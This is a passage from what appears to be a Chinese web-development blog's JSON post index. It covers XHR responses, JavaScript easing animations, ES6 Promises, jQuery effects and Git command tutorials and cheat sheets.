响应完成xhr.status//表示响应码，如200xhr.statusText//表示响应信息，如OKxhr.getAllResponseHeaders() //获取全部响应头信息xhr.getResponseHeader('key') //获取指定头信息xhr.responseText、xhr.responseXML//都表示响应主体 GET和POST的差别 ​ 1、GET没有请求主体，使用xhr.send(null)​ 2、GET可以通过在请求URL上添加请求参数​ 3、POST可以通过xhr.send(‘name=itcast&amp;age=10’)​ 4、POST需要设置​ 5、GET效率更好（应用多）​ 6、GET大小限制约4K，POST则没有限制","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"ajax","slug":"ajax","permalink":"http://www.wanyifeng.top/tags/ajax/"}]},{"title":"动画相关-缓动动画","date":"2016-02-15T02:10:50.000Z","path":"2016/02/15/动画相关-缓动动画/","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576//根据id获取对应的元素function my$(id) &#123; return document.getElementById(id);&#125;/** element---任意的元素* attr---属性* */function getAttrValue(element,attr) &#123; return element.currentStyle?element.currentStyle[attr] : window.getComputedStyle(element,null)[attr]||0;&#125;/** element----要移动的元素* target----移动的目标* 初级版本* */function animate1(element,target) &#123; clearInterval(element.timeId); element.timeId=setInterval(function () &#123; //获取当前的位置 var current=element.offsetLeft; //每次移动多少步 var step=(target-current)/10;//(目标-当前)/10 step=step&gt;0?Math.ceil(step):Math.floor(step); current=current+step; element.style.left=current+\"px\"; if(current==target)&#123; clearInterval(element.timeId); &#125; console.log(\"target:\"+target+\"current:\"+current+\"step:\"+step); &#125;,10);&#125;/** 终极版本的动画函数---有bug** */function animate(element,json,fn) &#123; clearInterval(element.timeId); element.timeId=setInterval(function () &#123; var flag=true;//假设都达到了目标 for(var attr in json)&#123; if(attr==\"opacity\")&#123;//判断属性是不是opacity var current= getAttrValue(element,attr)*100; //每次移动多少步 var target=json[attr]*100;//直接赋值给一个变量,后面的代码都不用改 var step=(target-current)/10;//(目标-当前)/10 step=step&gt;0?Math.ceil(step):Math.floor(step); current=current+step; element.style[attr]=current/100; &#125;else if(attr==\"zIndex\")&#123;//判断属性是不是zIndex element.style[attr]=json[attr]; &#125;else&#123;//普通的属性 //获取当前的位置----getAttrValue(element,attr)获取的是字符串类型 var current= parseInt(getAttrValue(element,attr))||0; //每次移动多少步 var target=json[attr];//直接赋值给一个变量,后面的代码都不用改 var step=(target-current)/10;//(目标-当前)/10 step=step&gt;0?Math.ceil(step):Math.floor(step); current=current+step; element.style[attr]=current+\"px\"; &#125; if(current!=target)&#123; flag=false;//如果没到目标结果就为false &#125; &#125; if(flag)&#123;//结果为true clearInterval(element.timeId); if(fn)&#123;//如果用户传入了回调的函数 fn(); //就直接的调用, &#125; &#125;// console.log(\"target:\"+target+\"current:\"+current+\"step:\"+step); &#125;,10);&#125;","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"能力检测","slug":"能力检测","permalink":"http://www.wanyifeng.top/tags/能力检测/"},{"name":"动画","slug":"动画","permalink":"http://www.wanyifeng.top/tags/动画/"}]},{"title":"ES6 Promise","date":"2016-02-05T11:03:21.000Z","path":"2016/02/05/Promise/","text":"ES6 Promise 先拉出来遛遛复杂的概念先不讲，我们先简单粗暴地把Promise用一下，有个直观感受。那么第一个问题来了，Promise是什么玩意呢？是一个类？对象？数组？函数？ 别猜了，直接打印出来看看吧，console.dir(Promise)，就这么简单粗暴。 这么一看就明白了，Promise是一个构造函数，自己身上有all、reject、resolve这几个眼熟的方法，原型上有then、catch等同样很眼熟的方法。这么说用Promise new出来的对象肯定就有then、catch方法喽，没错。 那就new一个玩玩吧。 ;) 1234567var p = new Promise(function(resolve, reject)&#123; //做一些异步操作 setTimeout(function()&#123; console.log('执行完成'); resolve('随便什么数据'); &#125;, 2000);&#125;); ;) Promise的构造函数接收一个参数，是函数，并且传入两个参数：resolve，reject，分别表示异步操作执行成功后的回调函数和异步操作执行失败后的回调函数。其实这里用“成功”和“失败”来描述并不准确，按照标准来讲，resolve是将Promise的状态置为fullfiled，reject是将Promise的状态置为rejected。不过在我们开始阶段可以先这么理解，后面再细究概念。 在上面的代码中，我们执行了一个异步操作，也就是setTimeout，2秒后，输出“执行完成”，并且调用resolve方法。 运行代码，会在2秒后输出“执行完成”。注意！我只是new了一个对象，并没有调用它，我们传进去的函数就已经执行了，这是需要注意的一个细节。所以我们用Promise的时候一般是包在一个函数中，在需要的时候去运行这个函数，如： ;) 1234567891011function runAsync()&#123; var p = new Promise(function(resolve, reject)&#123; //做一些异步操作 setTimeout(function()&#123; console.log('执行完成'); resolve('随便什么数据'); &#125;, 2000); &#125;); return p; &#125;runAsync() ;) 这时候你应该有两个疑问：1.包装这么一个函数有毛线用？2.resolve(‘随便什么数据’);这是干毛的？ 我们继续来讲。在我们包装好的函数最后，会return出Promise对象，也就是说，执行这个函数我们得到了一个Promise对象。还记得Promise对象上有then、catch方法吧？这就是强大之处了，看下面的代码： ;) 12345runAsync().then(function(data)&#123; console.log(data); //后面可以用传过来的数据做些其他操作 //......&#125;); ;) 在runAsync()的返回上直接调用then方法，then接收一个参数，是函数，并且会拿到我们在runAsync中调用resolve时传的的参数。运行这段代码，会在2秒后输出“执行完成”，紧接着输出“随便什么数据”。 这时候你应该有所领悟了，原来then里面的函数就跟我们平时的回调函数一个意思，能够在runAsync这个异步任务执行完成之后被执行。这就是Promise的作用了，简单来讲，就是能把原来的回调写法分离出来，在异步操作执行完后，用链式调用的方式执行回调函数。 你可能会不屑一顾，那么牛逼轰轰的Promise就这点能耐？我把回调函数封装一下，给runAsync传进去不也一样吗，就像这样： ;) 12345678910function runAsync(callback)&#123; setTimeout(function()&#123; console.log('执行完成'); callback('随便什么数据'); &#125;, 2000);&#125;runAsync(function(data)&#123; console.log(data);&#125;); ;) 效果也是一样的，还费劲用Promise干嘛。那么问题来了，有多层回调该怎么办？如果callback也是一个异步操作，而且执行完后也需要有相应的回调函数，该怎么办呢？总不能再定义一个callback2，然后给callback传进去吧。而Promise的优势在于，可以在then方法中继续写Promise对象并返回，然后继续调用then来进行回调操作。 链式操作的用法所以，从表面上看，Promise只是能够简化层层回调的写法，而实质上，Promise的精髓是“状态”，用维护状态、传递状态的方式来使得回调函数能够及时调用，它比传递callback函数要简单、灵活的多。所以使用Promise的正确场景是这样的： ;) 123456789101112runAsync1().then(function(data)&#123; console.log(data); return runAsync2();&#125;).then(function(data)&#123; console.log(data); return runAsync3();&#125;).then(function(data)&#123; console.log(data);&#125;); ;) 这样能够按顺序，每隔两秒输出每个异步回调中的内容，在runAsync2中传给resolve的数据，能在接下来的then方法中拿到。运行结果如下： 猜猜runAsync1、runAsync2、runAsync3这三个函数都是如何定义的？没错，就是下面这样（代码较长请自行展开）： View Code 在then方法中，你也可以直接return数据而不是Promise对象，在后面的then中就可以接收到数据了，比如我们把上面的代码修改成这样： ;) 123456789101112runAsync1().then(function(data)&#123; console.log(data); return runAsync2();&#125;).then(function(data)&#123; console.log(data); return '直接返回数据'; //这里直接返回数据&#125;).then(function(data)&#123; console.log(data);&#125;); ;) 那么输出就变成了这样： reject的用法到这里，你应该对“Promise是什么玩意”有了最基本的了解。那么我们接着来看看ES6的Promise还有哪些功能。我们光用了resolve，还没用reject呢，它是做什么的呢？事实上，我们前面的例子都是只有“执行成功”的回调，还没有“失败”的情况，reject的作用就是把Promise的状态置为rejected，这样我们在then中就能捕捉到，然后执行“失败”情况的回调。看下面的代码。 ;) 123456789101112131415161718192021222324252627function getNumber()&#123; var p = new Promise(function(resolve, reject)&#123; //做一些异步操作 setTimeout(function()&#123; var num = Math.ceil(Math.random()*10); //生成1-10的随机数 if(num&lt;=5)&#123; resolve(num); &#125; else&#123; reject('数字太大了'); &#125; &#125;, 2000); &#125;); return p; &#125;getNumber().then( function(data)&#123; console.log('resolved'); console.log(data); &#125;, function(reason, data)&#123; console.log('rejected'); console.log(reason); &#125;); ;) getNumber函数用来异步获取一个数字，2秒后执行完成，如果数字小于等于5，我们认为是“成功”了，调用resolve修改Promise的状态。否则我们认为是“失败”了，调用reject并传递一个参数，作为失败的原因。 运行getNumber并且在then中传了两个参数，then方法可以接受两个参数，第一个对应resolve的回调，第二个对应reject的回调。所以我们能够分别拿到他们传过来的数据。多次运行这段代码，你会随机得到下面两种结果： 或者 catch的用法我们知道Promise对象除了then方法，还有一个catch方法，它是做什么用的呢？其实它和then的第二个参数一样，用来指定reject的回调，用法是这样： ;) 123456789getNumber().then(function(data)&#123; console.log('resolved'); console.log(data);&#125;).catch(function(reason)&#123; console.log('rejected'); console.log(reason);&#125;); ;) 效果和写在then的第二个参数里面一样。不过它还有另外一个作用：在执行resolve的回调（也就是上面then中的第一个参数）时，如果抛出异常了（代码出错了），那么并不会报错卡死js，而是会进到这个catch方法中。请看下面的代码： ;) 12345678910getNumber().then(function(data)&#123; console.log('resolved'); console.log(data); console.log(somedata); //此处的somedata未定义&#125;).catch(function(reason)&#123; console.log('rejected'); console.log(reason);&#125;); ;) 在resolve的回调中，我们console.log(somedata);而somedata这个变量是没有被定义的。如果我们不用Promise，代码运行到这里就直接在控制台报错了，不往下运行了。但是在这里，会得到这样的结果： 也就是说进到catch方法里面去了，而且把错误原因传到了reason参数中。即便是有错误的代码也不会报错了，这与我们的try/catch语句有相同的功能。 all的用法Promise的all方法提供了并行执行异步操作的能力，并且在所有异步操作执行完后才执行回调。我们仍旧使用上面定义好的runAsync1、runAsync2、runAsync3这三个函数，看下面的例子： ;) 12345Promise.all([runAsync1(), runAsync2(), runAsync3()]).then(function(results)&#123; console.log(results);&#125;); ;) 用Promise.all来执行，all接收一个数组参数，里面的值最终都算返回Promise对象。这样，三个异步操作的并行执行的，等到它们都执行完后才会进到then里面。那么，三个异步操作返回的数据哪里去了呢？都在then里面呢，all会把所有异步操作的结果放进一个数组中传给then，就是上面的results。所以上面代码的输出结果就是： 有了all，你就可以并行执行多个异步操作，并且在一个回调中处理所有的返回数据，是不是很酷？有一个场景是很适合用这个的，一些游戏类的素材比较多的应用，打开网页时，预先加载需要用到的各种资源如图片、flash以及各种静态文件。所有的都加载完后，我们再进行页面的初始化。 race的用法all方法的效果实际上是「谁跑的慢，以谁为准执行回调」，那么相对的就有另一个方法「谁跑的快，以谁为准执行回调」，这就是race方法，这个词本来就是赛跑的意思。race的用法与all一样，我们把上面runAsync1的延时改为1秒来看一下： ;) 12345Promise.race([runAsync1(), runAsync2(), runAsync3()]).then(function(results)&#123; console.log(results);&#125;); ;) 这三个异步操作同样是并行执行的。结果你应该可以猜到，1秒后runAsync1已经执行完了，此时then里面的就执行了。结果是这样的： 你猜对了吗？不完全，是吧。在then里面的回调开始执行时，runAsync2()和runAsync3()并没有停止，仍旧再执行。于是再过1秒后，输出了他们结束的标志。 这个race有什么用呢？使用场景还是很多的，比如我们可以用race给某个异步请求设置超时时间，并且在超时后执行相应的操作，代码如下： ;) 123456789101112131415161718192021222324252627282930//请求某个图片资源function requestImg()&#123; var p = new Promise(function(resolve, reject)&#123; var img = new Image(); img.onload = function()&#123; resolve(img); &#125; img.src = 'xxxxxx'; &#125;); return p;&#125;//延时函数，用于给请求计时function timeout()&#123; var p = new Promise(function(resolve, reject)&#123; setTimeout(function()&#123; reject('图片请求超时'); &#125;, 5000); &#125;); return p;&#125;Promise.race([requestImg(), timeout()]).then(function(results)&#123; console.log(results);&#125;).catch(function(reason)&#123; console.log(reason);&#125;); ;) requestImg函数会异步请求一张图片，我把地址写为”xxxxxx”，所以肯定是无法成功请求到的。timeout函数是一个延时5秒的异步操作。我们把这两个返回Promise对象的函数放进race，于是他俩就会赛跑，如果5秒之内图片请求成功了，那么遍进入then方法，执行正常的流程。如果5秒钟图片还未成功返回，那么timeout就跑赢了，则进入catch，报出“图片请求超时”的信息。运行结果如下： 总结ES6 Promise的内容就这些吗？是的，能用到的基本就这些。 我怎么还见过done、finally、success、fail等，这些是啥？这些并不在Promise标准中，而是我们自己实现的语法糖。 本文中所有异步操作均以setTimeout为例子，之所以不使用ajax是为了避免引起混淆，因为谈起ajax，很多人的第一反应就是jquery的ajax，而jquery又有自己的Promise实现。如果你理解了原理，就知道使用setTimeout和使用ajax是一样的意思。说起jquery，我不得不吐槽一句，jquery的Promise实现太过垃圾，各种语法糖把人都搞蒙了，我认为Promise之所以没有全面普及和jquery有很大的关系。后面我们会细讲jquery。 转载自 http://www.cnblogs.com/lvdabao/p/es6-promise-1.html 参考文章 ​ https://github.com/linkFly6/Promise ​ http://www.cnblogs.com/lvdabao/p/jquery-deferred.html","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"ajax","slug":"ajax","permalink":"http://www.wanyifeng.top/tags/ajax/"}]},{"title":"Git基础入门","date":"2016-01-05T10:33:21.000Z","path":"2016/01/05/Git/","text":"Git基础命令git config –global user.name “自已的名字”git config –global user.email “自已的邮箱地址”–global：表示本机只需要配置一次，本地的所有git仓库都是共享该信息的 git init 初始化 git status 查看文件状态 git add 1.txt-ca 添加文件到监控git add 1.txt 2.txt 3.html 可以添加多个文件到监控git add * 把所有文件添加到监控git add -A 把所有文件添加到监控 并且 删除的文件变化也提交给暂存区 重要git commit -m 把暂存区的文件提交到本地仓库 git log 打印提交git log –oneline：查看提交日志简略显示git reflog 查看历史记录 这些历史记录包括：每一次提交的信息；以及每一次版本回滚的操作 git checkout – 1.txt：将暂存区中的文件取出并替换工作目录的文件git reset HEAD 1.txt：将暂存区的文件取出来，对工作目录的代码不会造成影响git reset –hard 提交的版本号(可以只写前几位) git rm -f 文件名 删除暂存区和工作区的文件 git push {远程主机} {本地分支}:{远程分支} 如果没有远程分支会创建远程分支git push {远程主机} {本地分支} 不写远程分支,远程会自动创建分支 git pull取回远程主机某个分支的更新，再与本地的指定分支合并。 用法：git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;会读操作会操作远程仓库会读 可以不指定本地的指定分支，默认就是当前处于哪个分支 git fetch：取回服务器中的指定分支 git fetch取回所有分支的更新。 如果只想取回特定分支的更新，可以指定分支名。 用法：git fetch &lt;远程主机名&gt; &lt;分支名&gt; 备注：取出来的分支可以使用 git branch -a 获取后续可以根据自己的需求采取分支合并操作 设置文件不让git管理1、在.git所在目录添加一个文件，叫 .gitignore2、打开.gitignore进行编辑，一行一行的添加不需要git管理的文件 删除错误提交的commit(个人建议不使用 只要进行覆盖操作 不做删除操作)有时，不仅添加到了暂存区，而且commit到了版本库，这个时候就不能使用git rm了，需要使用git reset命令。 错误提交到了版本库，此时无论工作区、暂存区，还是版本库，这三者的内容都是一样的 ，所以在这种情况下，只是删除了工作区和暂存区的文件，下一次用该版本库回滚那个误添加的文件还会重新生成。 这个时候，我们必须撤销版本库的修改才能解决问题！ git reset有三个选项，–hard、–mixed、–soft。 12//仅仅只是撤销已提交的版本库，不会修改暂存区和工作区git reset --soft 版本库ID 12//仅仅只是撤销已提交的版本库和暂存区，不会修改工作区git reset --mixed 版本库ID 12//彻底将工作区、暂存区和版本库记录恢复到指定的版本库git reset --hard 版本库ID 那我们到底应该用哪个选项好呢？ （1）如果你是在提交了后，对工作区的代码做了修改，并且想保留这些修改，那么可以使用git reset –mixed 版本库ID，注意这个版本库ID应该不是你刚刚提交的版本库ID，而是 刚刚提交版本库的上一个版本库 。如下图： （2）如果不想保留这些修改，可以直接使用彻底的恢复命令，git reset –hard 版本库ID。 （3）为什么不使用–soft呢，因为它只是恢复了版本库， 暂存区仍然存在你错误提交的文件索引 ，还需要进一步使用上一节的 删除错误添加到暂存区的文件，详细见上文。 本地仓库图解 远程仓库图解 Github入门Github基本使用 注册账号 登录 创建一个仓库： a、点击右上角”+”–&gt;”add new repository” b、依次输入仓库名称、仓库描述、以及是否为公开的(私密的要钱)， c、点击 create repository按钮 Github跟本地仓库进行交互将github上某个仓库的内容下载到本地git clone 远程仓库地址git clone 远程仓库地址 本地文件夹路径：将远程仓库的内容拷贝到本地指定文件夹举例：git clone https://github.com/WanYiFeng/test006.github.io.git 将本地仓库的代码提交到git服务器中a、git push 远程服务器仓库的地址 master注意点：第一次提交到github的时候会提示你输入github的用户名和密码 b、也可以给服务器地址起一个名称，如下：git remote add origin 服务器地址git push origin master 补充：git remote表示该自命令下面已经添加过的名称 c、git push -u master：默认将本地当前分支与远程服务器某个分支关联，后续的push不需要再次指定远程服务器分支名称 Git本地分支映射到github中 在本地创建一个新的分支2、将代码提交到该分支中3、git push 远程仓库地址 远程仓库的新分支的名称 Github搭建静态服务器1、新建一个仓库，仓库名字：用户名.github.io 1一个用户只能拥有一个自己的网站 2、往该github仓库中添加代码，注意最好给这些目录中添加一个index.html文件3、直接使用仓库的名字作为网站的地址来访问 手动删除本机的文件同步到远程git add -A 同步删除的文件 git commit -m 删除了一些文件 git push 服务器url master 分支：分支的必要性？分支操作命令：git branch：查看当前仓库中所有的分支*：表示当前处于哪一个分支 git branch 名称：创建一个指定的分支 git checkout 分支名称：切换到指定的分支 1切换后的代码就是指定分支的代码 git merge 分支名：将指定分支合并到当前分支下 分支冲突：如果两个合并的分支操作了同样的文件，这时候很可能产生冲突，这样这两个分支在合并的时候就会提示合并出现失败，这时候需要手动解决冲突，解决好冲突之后，重新将代码提交 git branch -d 分支名称：删除指定的分支 分支使用说明 在创建分支的时候，一定要对创建的分支所处于的那个分支，要在该分支稳定的时候才能创建；在该分支的代码完全提交之后才能创建新分支 本地分支和远程分支是两个独立体 分支使用策略1、在开发一个项目的时候具有一个master分支2、在做某个功能的时候(登录、注册或购物车等)，一般开辟一个新的分支，在该分支下进行开发代码，该功能做完并测试好之后，将该分支的代码合并到master分支中 Github进阶比较文件差异git diff1、比较工作目录和暂存区的代码比较2、如果暂存区没有文件，则将工作区和最近一次提交的代码进行对比 git diff –cached：将暂存区的文件和工作区的文件进行对比SSH对称性加密非对称性加密配置SSH连接github 在本地生成秘钥：ssh-keygen -t rsa 找到秘钥生成的目录，将公钥放到Github中 a、github点击右上角人物头像 b、选择settings菜单 c、选择SSH相关菜单 d、选择添加一个SSH e、输入ssh的名称，已知内容（就是公钥）将公钥放入其中，保存即可 在本地测试 ssh git@github.com看看是否成功Hi chengxc! You’ve successfully authenticated, but GitHub does not provide shell access. 提交代码备注：如果在提交代码的时候github中已经含有内容，最好先更新代码，使用：git pull –rebase origin master","comments":true,"tags":[{"name":"Git","slug":"Git","permalink":"http://www.wanyifeng.top/tags/Git/"}]},{"title":"jQuery动画API","date":"2016-01-05T06:33:21.000Z","path":"2016/01/05/jquery/","text":"hide 隐藏12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;script src=\"js/jquery-3.0.0.min.js\" type=\"text/javascript\" charset=\"utf-8\"&gt;&lt;/script&gt; &lt;script type=\"text/javascript\"&gt; $(document).ready(function() &#123; $(\".ex .hide\").click(function() &#123; console.log($(this)); console.log($(this).parents()); //包含body html 节点的对象 console.log($(this).parents(\".ex\")); //.ex元素 console.log($(this).parents(\".ex\").hide(500)) //500毫秒淡入淡出 $(this).parents(\".ex\").hide(\"slow\") //淡入淡出; &#125;); &#125;); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;h3&gt;中国办事处&lt;/h3&gt; &lt;div class=\"ex\"&gt; &lt;button class=\"hide\" type=\"button\"&gt;隐藏&lt;/button&gt; &lt;p&gt;联系人：张先生&lt;br /&gt; 北三环中路 100 号&lt;br /&gt; 北京 &lt;/p&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; shou 显示123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;script src=\"js/jquery-3.0.0.min.js\" type=\"text/javascript\" charset=\"utf-8\"&gt;&lt;/script&gt; &lt;script type=\"text/javascript\"&gt; $(document).ready(function() &#123; $(\"#hide\").click(function() &#123; $(\"p\").hide(500); &#125;); $(\"#show\").click(function() &#123; $(\"p\").show(500); &#125;); &#125;); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;p id=\"p1\"&gt;如果点击“隐藏”按钮，我就会消失。&lt;/p&gt; &lt;button id=\"hide\" type=\"button\"&gt;隐藏&lt;/button&gt; &lt;button id=\"show\" type=\"button\"&gt;显示&lt;/button&gt; &lt;/body&gt;&lt;/html&gt; ###滑动 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;script src=\"js/jquery-3.0.0.min.js\" type=\"text/javascript\" charset=\"utf-8\"&gt;&lt;/script&gt; &lt;script type=\"text/javascript\"&gt; $(document).ready(function() &#123; $(\".flip\").click(function() &#123; $(\".panel\").slideDown(1000);//滑动显示 $(\".panel\").slideUp(1000);//滑动隐藏 $(\".panel\").slideToggle(1000);//切换 &#125;); &#125;); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=\"panel\"&gt; &lt;p&gt;W3School - 领先的 Web 技术教程站点&lt;/p&gt; &lt;p&gt;在 W3School，你可以找到你所需要的所有网站建设教程。&lt;/p&gt; &lt;/div&gt; &lt;p class=\"flip\"&gt;请点击这里&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 动画 基本语法: $(selector).animate({params},speed,callback); jQuery animate() - 使用相对值 也可以定义相对值（该值相对于元素的当前值）。需要在值的前面加上 += 或 -=： 1234567$(\"button\").click(function()&#123; $(\"div\").animate(&#123; left:'250px', height:'+=150px', width:'+=150px' &#125;);&#125;); jQuery animate() - 使用预定义的值您甚至可以把属性的动画值设置为 “show”、”hide” 或 “toggle”：实例 12345$(\"button\").click(function()&#123; $(\"div\").animate(&#123; height:'toggle' &#125;);&#125;); 隐藏，如果您希望在彼此之后执行不同的动画，那么我们要利用队列功能： 1234567$(\"button\").click(function()&#123; var div=$(\"div\"); div.animate(&#123;height:'300px',opacity:'0.4'&#125;,\"slow\"); div.animate(&#123;width:'300px',opacity:'0.8'&#125;,\"slow\"); div.animate(&#123;height:'100px',opacity:'0.4'&#125;,\"slow\"); div.animate(&#123;width:'100px',opacity:'0.8'&#125;,\"slow\");&#125;); 12345$(\"button\").click(function()&#123; var div=$(\"div\"); div.animate(&#123;left:'100px'&#125;,\"slow\"); div.animate(&#123;fontSize:'3em'&#125;,\"slow\");&#125;); 注意jquery不能实现color颜色的变换 包括背景和颜色变化 jQuery stop() 方法 jQuery stop() 方法用于停止动画或效果，在它们完成之前。stop() 方法适用于所有 jQuery 效果函数，包括滑动、淡入淡出和自定义动画。 语法 1$(selector).stop(stopAll,goToEnd); 可选的 stopAll 参数规定是否应该清除动画队列。默认是 false，即仅停止活动的动画，允许任何排入队列的动画向后执行。 可选的 goToEnd 参数规定是否立即完成当前动画。默认是 false。 因此，默认地，stop() 会清除在被选元素上指定的当前动画。 多库共存12345(function ()&#123; //拷贝jq_min代码 //加上 var $jq = $.noConflict(true);&#125;)()","comments":true,"tags":[{"name":"jQuery","slug":"jQuery","permalink":"http://www.wanyifeng.top/tags/jQuery/"}]},{"title":"获取当前元素前一个元素","date":"2016-01-05T03:25:44.000Z","path":"2016/01/05/获取上一个元素/","text":"123456789101112//获取当前元素前一个元素function getPreviousElement(element) &#123; if(element.previousElementSibling)&#123; return element.previousElementSibling; &#125;else&#123; var ele=element.previousSibling; while (ele&amp;&amp;ele.nodeType!==1)&#123; ele=ele.previousSibling; &#125; return ele; &#125;&#125;","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"能力检测","slug":"能力检测","permalink":"http://www.wanyifeng.top/tags/能力检测/"}]},{"title":"常用 Git 命令清单","date":"2015-12-20T02:43:01.000Z","path":"2015/12/20/常用 Git 命令清单/","text":"作者： 阮一峰 日期： 2015年12月 9日 我每天使用 Git ，但是很多命令记不住。 一般来说，日常使用只要记住下图6个命令，就可以了。但是熟练使用，恐怕要记住60～100个命令。 下面是我整理的常用 Git 命令清单。几个专用名词的译名如下。 Workspace：工作区 Index / Stage：暂存区 Repository：仓库区（或本地仓库） Remote：远程仓库 一、新建代码库 12345678910&gt; # 在当前目录新建一个Git代码库&gt; $ git init&gt;&gt; # 新建一个目录，将其初始化为Git代码库&gt; $ git init [project-name]&gt;&gt; # 下载一个项目和它的整个代码历史&gt; $ git clone [url]&gt;&gt; 二、配置Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。 1234567891011&gt; # 显示当前的Git配置&gt; $ git config --list&gt;&gt; # 编辑Git配置文件&gt; $ git config -e [--global]&gt;&gt; # 设置提交代码时的用户信息&gt; $ git config [--global] user.name \"[name]\"&gt; $ git config [--global] user.email \"[email address]\"&gt;&gt; 三、增加/删除文件 1234567891011121314151617181920212223&gt; # 添加指定文件到暂存区&gt; $ git add [file1] [file2] ...&gt;&gt; # 添加指定目录到暂存区，包括子目录&gt; $ git add [dir]&gt;&gt; # 添加当前目录的所有文件到暂存区&gt; $ git add .&gt;&gt; # 添加每个变化前，都会要求确认&gt; # 对于同一个文件的多处变化，可以实现分次提交&gt; $ git add -p&gt;&gt; # 删除工作区文件，并且将这次删除放入暂存区&gt; $ git rm [file1] [file2] ...&gt;&gt; # 停止追踪指定文件，但该文件会保留在工作区&gt; $ git rm --cached [file]&gt;&gt; # 改名文件，并且将这个改名放入暂存区&gt; $ git mv [file-original] [file-renamed]&gt;&gt; 四、代码提交 1234567891011121314151617181920&gt; # 提交暂存区到仓库区&gt; $ git commit -m [message]&gt;&gt; # 提交暂存区的指定文件到仓库区&gt; $ git commit [file1] [file2] ... -m [message]&gt;&gt; # 提交工作区自上次commit之后的变化，直接到仓库区&gt; $ git commit -a&gt;&gt; # 提交时显示所有diff信息&gt; $ git commit -v&gt;&gt; # 使用一次新的commit，替代上一次提交&gt; # 如果代码没有任何新变化，则用来改写上一次commit的提交信息&gt; $ git commit --amend -m [message]&gt;&gt; # 重做上一次commit，并包括指定文件的新变化&gt; $ git commit --amend [file1] [file2] ...&gt;&gt; 五、分支 1234567891011121314151617181920212223242526272829303132333435363738394041424344&gt; # 列出所有本地分支&gt; $ git branch&gt;&gt; # 列出所有远程分支&gt; $ git branch -r&gt;&gt; # 列出所有本地分支和远程分支&gt; $ git branch -a&gt;&gt; # 新建一个分支，但依然停留在当前分支&gt; $ git branch [branch-name]&gt;&gt; # 新建一个分支，并切换到该分支&gt; $ git checkout -b [branch]&gt;&gt; # 新建一个分支，指向指定commit&gt; $ git branch [branch] [commit]&gt;&gt; # 新建一个分支，与指定的远程分支建立追踪关系&gt; $ git branch --track [branch] [remote-branch]&gt;&gt; # 切换到指定分支，并更新工作区&gt; $ git checkout [branch-name]&gt;&gt; # 切换到上一个分支&gt; $ git checkout -&gt;&gt; # 建立追踪关系，在现有分支与指定的远程分支之间&gt; $ git branch --set-upstream [branch] [remote-branch]&gt;&gt; # 合并指定分支到当前分支&gt; $ git merge [branch]&gt;&gt; # 选择一个commit，合并进当前分支&gt; $ git cherry-pick [commit]&gt;&gt; # 删除分支&gt; $ git branch -d [branch-name]&gt;&gt; # 删除远程分支&gt; $ git push origin --delete [branch-name]&gt; $ git branch -dr [remote/branch]&gt;&gt; 六、标签 12345678910111213141516171819202122232425262728&gt; # 列出所有tag&gt; $ git tag&gt;&gt; # 新建一个tag在当前commit&gt; $ git tag [tag]&gt;&gt; # 新建一个tag在指定commit&gt; $ git tag [tag] [commit]&gt;&gt; # 删除本地tag&gt; $ git tag -d [tag]&gt;&gt; # 删除远程tag&gt; $ git push origin :refs/tags/[tagName]&gt;&gt; # 查看tag信息&gt; $ git show [tag]&gt;&gt; # 提交指定tag&gt; $ git push [remote] [tag]&gt;&gt; # 提交所有tag&gt; $ git push [remote] --tags&gt;&gt; # 新建一个分支，指向某个tag&gt; $ git checkout -b [branch] [tag]&gt;&gt; 七、查看信息 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&gt; # 显示有变更的文件&gt; $ git status&gt;&gt; # 显示当前分支的版本历史&gt; $ git log&gt;&gt; # 显示commit历史，以及每次commit发生变更的文件&gt; $ git log --stat&gt;&gt; # 搜索提交历史，根据关键词&gt; $ git log -S [keyword]&gt;&gt; # 显示某个commit之后的所有变动，每个commit占据一行&gt; $ git log [tag] HEAD --pretty=format:%s&gt;&gt; # 显示某个commit之后的所有变动，其\"提交说明\"必须符合搜索条件&gt; $ git log [tag] HEAD --grep feature&gt;&gt; # 显示某个文件的版本历史，包括文件改名&gt; $ git log --follow [file]&gt; $ git whatchanged [file]&gt;&gt; # 显示指定文件相关的每一次diff&gt; $ git log -p [file]&gt;&gt; # 显示过去5次提交&gt; $ git log -5 --pretty --oneline&gt;&gt; # 显示所有提交过的用户，按提交次数排序&gt; $ git shortlog -sn&gt;&gt; # 显示指定文件是什么人在什么时间修改过&gt; $ git blame [file]&gt;&gt; # 显示暂存区和工作区的差异&gt; $ git diff&gt;&gt; # 显示暂存区和上一个commit的差异&gt; $ git diff --cached [file]&gt;&gt; # 显示工作区与当前分支最新commit之间的差异&gt; $ git diff HEAD&gt;&gt; # 显示两次提交之间的差异&gt; $ git diff [first-branch]...[second-branch]&gt;&gt; # 显示今天你写了多少行代码&gt; $ git diff --shortstat \"@&#123;0 day ago&#125;\"&gt;&gt; # 显示某次提交的元数据和内容变化&gt; $ git show [commit]&gt;&gt; # 显示某次提交发生变化的文件&gt; $ git show --name-only [commit]&gt;&gt; # 显示某次提交时，某个文件的内容&gt; $ git show [commit]:[filename]&gt;&gt; # 显示当前分支的最近几次提交&gt; $ git reflog&gt;&gt; 八、远程同步 12345678910111213141516171819202122232425&gt; # 下载远程仓库的所有变动&gt; $ git fetch [remote]&gt;&gt; # 显示所有远程仓库&gt; $ git remote -v&gt;&gt; # 显示某个远程仓库的信息&gt; $ git remote show 